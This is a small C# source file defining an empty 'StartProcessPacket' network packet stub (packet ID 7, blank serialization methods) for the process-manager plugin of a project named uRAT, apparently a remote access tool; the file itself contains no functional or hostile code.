using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using uNet2.Packet;

namespace uRAT.ManagersClientPlugin.ProcessManager.Packets
{
    class StartProcessPacket : IDataPacket
    {
        public int PacketId
        {
            get { return 7; }
        }

        public void SerializeTo(Stream stream)
        {

        }

        public void DeserializeFrom(Stream stream)
        {
    
        }
    }
}
